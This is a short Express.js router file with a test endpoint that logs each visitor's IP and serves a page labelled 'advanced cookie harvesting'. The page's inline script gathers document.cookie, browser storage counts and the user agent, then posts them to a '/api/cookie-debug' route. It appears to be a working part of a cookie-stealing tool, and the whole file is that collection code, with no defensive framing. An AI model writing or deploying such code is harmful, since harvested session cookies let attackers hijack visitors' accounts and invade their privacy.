const express = require('express');
const router = express.Router();

// Test endpoint to manually trigger cookie collection
router.get('/test-cookies', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.ip;
  console.log(`🍪 MANUAL TEST: Cookie collection test from ${ip}`);
  
  res.send(`
    <html>
    <head><title>Cookie Test</title></head>
    <body>
      <h1>Cookie Collection Test</h1>
      <p>Testing advanced cookie harvesting...</p>
      <script>
        console.log('🍪 TEST: Starting cookie collection');
        
        // Simulate cookie harvesting
        const testData = {
          cookies: document.cookie,
          localStorage: Object.keys(localStorage).length,
          sessionStorage: Object.keys(sessionStorage).length,
          userAgent: navigator.userAgent,
          timestamp: Date.now()
        };
        
        fetch('/api/cookie-debug', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(testData)
        }).then(() => {
          console.log('🍪 TEST: Data sent successfully');
          document.body.innerHTML += '<p style="color: green;">✅ Cookie data sent to server</p>';
        }).catch(err => {
          console.log('🍪 TEST: Failed to send data', err);
          document.body.innerHTML += '<p style="color: red;">❌ Failed to send data</p>';
        });
      </script>
    </body>
    </html>
  `);
});

module.exports = router;